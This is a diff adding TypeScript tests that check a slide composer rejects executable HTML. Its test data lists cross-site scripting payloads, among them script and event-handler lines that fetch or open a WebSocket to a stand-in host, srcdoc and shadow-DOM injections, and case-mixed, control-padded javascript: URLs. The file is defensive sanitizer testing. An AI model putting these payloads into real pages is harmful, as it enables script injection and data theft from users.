@@ -360,3 +360,35 @@ test("rejects legacy resource-loading attributes before returning final HTML", a
     (error: unknown) => error instanceof Error && /resource/i.test(error.message) && !error.message.includes(remote),
   );
 });
+
+for (const [name, injected] of [
+  ["script element", '<script>fetch("https://example.invalid/private")</script>'],
+  ["mixed-case event fetch handler", '<div OnMoUsEeNtEr="fetch(\'https://example.invalid/private\')">hover</div>'],
+  ["event WebSocket handler", '<div onpointerenter="new WebSocket(\'wss://example.invalid/private\')">hover</div>'],
+  ["srcdoc attribute", '<div SrCdOc="<script>top.pwned=true</script>">embedded markup</div>'],
+  ["declarative shadow template", '<template shadowrootmode="open"><iframe srcdoc="<script>top.pwned=true</script>"></iframe></template>'],
+  ["SVG namespace event handler", '<svg xmlns="http://www.w3.org/2000/svg"><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)" oNcLiCk="alert(1)">x</a></svg>'],
+  ["MathML event handler", '<math xmlns="http://www.w3.org/1998/Math/MathML"><mtext onload="alert(1)">x</mtext></math>'],
+  ["form navigation", '<form AcTiOn="javascript:alert(1)"><button formaction="https://example.invalid/private">go</button></form>'],
+] as const) {
+  test(`rejects executable final DOM through ${name}`, async () => {
+    const parsed = { ...template, html: template.html.replace("</body>", `${injected}</body>`) };
+    await assert.rejects(
+      () => composeSlide({ spec, template: parsed, profile, assets }),
+      (error: unknown) => error instanceof Error
+        && /executable|unsafe|resource|navigation|template/i.test(error.message)
+        && !error.message.includes("example.invalid"),
+    );
+  });
+}
+
+test("rejects case-insensitive executable protocols padded with controls", async () => {
+  const parsed = {
+    ...template,
+    html: template.html.replace("</body>", '<a href="&#x09;JaVaScRiPt:alert(1)">unsafe link</a></body>'),
+  };
+  await assert.rejects(
+    () => composeSlide({ spec, template: parsed, profile, assets }),
+    /executable|unsafe|resource|navigation/i,
+  );
+});
